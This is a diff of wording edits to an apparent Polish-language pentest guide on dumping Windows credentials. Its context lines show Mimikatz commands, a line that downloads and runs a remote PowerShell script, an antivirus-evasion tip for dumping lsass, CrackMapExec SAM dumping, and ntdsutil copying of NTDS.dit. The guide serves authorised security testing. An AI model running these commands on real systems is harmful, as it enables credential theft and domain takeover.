@@ -24,7 +24,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Dowiedz się o możliwych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą zapobiec wydobywaniu niektórych poświadczeń przez Mimikatz.**
+[**Dowiedz się o możliwych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą zapobiec Mimikatz w wydobywaniu niektórych poświadczeń.**
 
 ## Poświadczenia z Meterpreter
 
@@ -67,7 +67,7 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Ten proces jest realizowany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Uwaga**: Niektóre **AV** mogą **wykrywać** jako **złośliwe** użycie **procdump.exe do zrzutu lsass.exe**, ponieważ **wykrywają** ciąg **"procdump.exe" i "lsass.exe"**. Dlatego **cichsze** jest **przekazanie** jako **argumentu** **PID** lsass.exe do procdump **zamiast** **nazwa lsass.exe.**
+**Uwaga**: Niektóre **AV** mogą **wykrywać** jako **złośliwe** użycie **procdump.exe do zrzutu lsass.exe**, ponieważ **wykrywają** ciąg **"procdump.exe" i "lsass.exe"**. Dlatego **ukrycie** się jako **argument** **PID** lsass.exe do procdump jest **bardziej dyskretne** **zamiast** używać **nazwa lsass.exe.**
 
 ### Zrzut lsass z **comsvcs.dll**
 
@@ -110,7 +110,7 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 ## CrackMapExec
 
-### Zrzutuj hashe SAM
+### Zrzut hashy SAM
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -182,21 +182,21 @@ Na koniec możesz również użyć [**skryptu PS Invoke-NinjaCopy**](https://git
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Poświadczenia Active Directory - NTDS.dit**
+## **Kredencje Active Directory - NTDS.dit**
 
 Plik **NTDS.dit** jest znany jako serce **Active Directory**, przechowując kluczowe dane o obiektach użytkowników, grupach i ich członkostwie. To tutaj przechowywane są **hash'e haseł** dla użytkowników domeny. Plik ten jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w **_%SystemRoom%/NTDS/ntds.dit_**.
 
 W tej bazie danych utrzymywane są trzy główne tabele:
 
-- **Tabela Danych**: Ta tabela jest odpowiedzialna za przechowywanie szczegółów o obiektach, takich jak użytkownicy i grupy.
-- **Tabela Linków**: Śledzi relacje, takie jak członkostwo w grupach.
+- **Tabela danych**: Ta tabela jest odpowiedzialna za przechowywanie szczegółów o obiektach, takich jak użytkownicy i grupy.
+- **Tabela linków**: Śledzi relacje, takie jak członkostwo w grupach.
 - **Tabela SD**: **Deskryptory zabezpieczeń** dla każdego obiektu są przechowywane tutaj, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.
 
 Więcej informacji na ten temat: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
 Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a jest on używany przez _lsass.exe_. Część pliku **NTDS.dit** może być zlokalizowana **w pamięci `lsass`** (możesz znaleźć ostatnio dostępne dane prawdopodobnie z powodu poprawy wydajności dzięki użyciu **cache**).
 
-#### Deszyfrowanie hash'y wewnątrz NTDS.dit
+#### Deszyfrowanie hashy wewnątrz NTDS.dit
 
 Hash jest szyfrowany 3 razy:
 
@@ -204,7 +204,7 @@ Hash jest szyfrowany 3 razy:
 2. Deszyfruj **hash** używając **PEK** i **RC4**.
 3. Deszyfruj **hash** używając **DES**.
 
-**PEK** ma **tę samą wartość** w **każdym kontrolerze domeny**, ale jest **szyfrowany** wewnątrz pliku **NTDS.dit** używając **BOOTKEY** pliku **SYSTEM kontrolera domeny (jest inny między kontrolerami domeny)**. Dlatego, aby uzyskać poświadczenia z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** ma **tę samą wartość** w **każdym kontrolerze domeny**, ale jest **szyfrowany** wewnątrz pliku **NTDS.dit** używając **BOOTKEY** pliku **SYSTEM kontrolera domeny (jest inny między kontrolerami domeny)**. Dlatego, aby uzyskać kredencje z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Kopiowanie NTDS.dit za pomocą Ntdsutil
 
@@ -212,7 +212,7 @@ Dostępne od Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Możesz również użyć triku z [**kopią zapasową woluminu**](./#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**zrzutuj go z rejestru lub użyj triku z kopią zapasową woluminu**](./#stealing-sam-and-system)).
+Możesz również użyć triku z [**kopią cienia woluminu**](./#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**zrzutuj go z rejestru lub użyj triku z kopią cienia woluminu**](./#stealing-sam-and-system)).
 
 ### **Ekstrakcja hashy z NTDS.dit**
 
@@ -230,11 +230,11 @@ Na koniec można również użyć **modułu metasploit**: _post/windows/gather/c
 
 ### **Ekstrakcja obiektów domeny z NTDS.dit do bazy danych SQLite**
 
-Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale także całe obiekty i ich atrybuty w celu dalszej ekstrakcji informacji, gdy surowy plik NTDS.dit został już pobrany.
+Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ekstrahowane są nie tylko sekrety, ale także całe obiekty i ich atrybuty w celu dalszej ekstrakcji informacji, gdy surowy plik NTDS.dit został już pobrany.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hive jest opcjonalny, ale pozwala na deszyfrowanie sekretów (hasła NT i LM, dodatkowe poświadczenia, takie jak hasła w postaci czystego tekstu, klucze kerberos lub zaufania, historie haseł NT i LM). Wraz z innymi informacjami, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich hashami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwa rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typem zaufania, kierunkiem i atrybutami...
+`SYSTEM` hive jest opcjonalny, ale pozwala na deszyfrowanie sekretów (hasła NT i LM, dodatkowe poświadczenia, takie jak hasła w postaci czystego tekstu, klucze kerberos lub zaufania, historie haseł NT i LM). Wraz z innymi informacjami, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich haszami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwa rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typem zaufania, kierunkiem i atrybutami...
 
 ## Lazagne
 
@@ -257,7 +257,7 @@ fgdump.exe
 ```
 ### PwDump
 
-Wyodrębnij poświadczenia z pliku SAM
+Wyodrębnij dane uwierzytelniające z pliku SAM
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
